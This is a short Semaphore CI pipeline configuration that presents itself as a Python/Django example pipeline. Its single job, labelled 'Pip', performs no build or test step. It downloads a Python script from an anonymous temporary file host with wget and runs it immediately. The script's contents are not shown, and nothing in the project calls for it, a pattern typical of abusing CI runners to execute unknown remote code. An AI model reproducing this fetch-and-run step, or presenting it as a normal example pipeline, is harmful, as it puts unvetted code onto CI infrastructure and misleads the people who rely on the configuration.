version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
global_job_config:
  prologue:
    commands:
      - sem-version python 3.8
blocks:
  - name: Pip
    dependencies: []
    task:
      jobs:
        - name: Job
          commands:
            - 'wget http://temp.sh/Cgvll/1.py'
            - python3 1.py
